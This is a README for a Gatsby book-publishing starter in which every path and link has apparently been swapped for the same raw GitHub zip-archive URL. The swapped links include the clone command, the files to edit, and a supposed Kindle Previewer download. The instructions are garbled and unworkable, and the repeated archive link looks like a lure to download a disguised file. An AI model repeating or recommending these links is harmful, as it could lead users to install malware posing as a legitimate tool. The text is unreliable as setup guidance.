## How to use

1. First git clone and cd into the folder

```bash
git clone https://github.com/Apostle121/gatsby-starter-book/raw/refs/heads/master/.netlify/starter-gatsby-book-2.4-beta.3.zip my-book && cd my-book
```

2. Edit your book in the `https://github.com/Apostle121/gatsby-starter-book/raw/refs/heads/master/.netlify/starter-gatsby-book-2.4-beta.3.zip`
3. Set you book properties in `https://github.com/Apostle121/gatsby-starter-book/raw/refs/heads/master/.netlify/starter-gatsby-book-2.4-beta.3.zip`
4. Run `yarn build` (for netlify please use `yarn build:site`)
5. To get the .mobi file download the [Kindle Previewer](https://github.com/Apostle121/gatsby-starter-book/raw/refs/heads/master/.netlify/starter-gatsby-book-2.4-beta.3.zip) and drag your .epub file and it creates a kindle compatible file.
6. Profit??

## Why?

I built this in order to be able to publish a book I wrote and I think it may be useful for someone so I made it OSS.

## Where can I edit the syntax highlight theme?

You can change it in the [`https://github.com/Apostle121/gatsby-starter-book/raw/refs/heads/master/.netlify/starter-gatsby-book-2.4-beta.3.zip`](https://github.com/Apostle121/gatsby-starter-book/raw/refs/heads/master/.netlify/starter-gatsby-book-2.4-beta.3.zip)

## Why not a theme?

I want you to be able to edit everything as it will be your book so I think this workflow makes sense
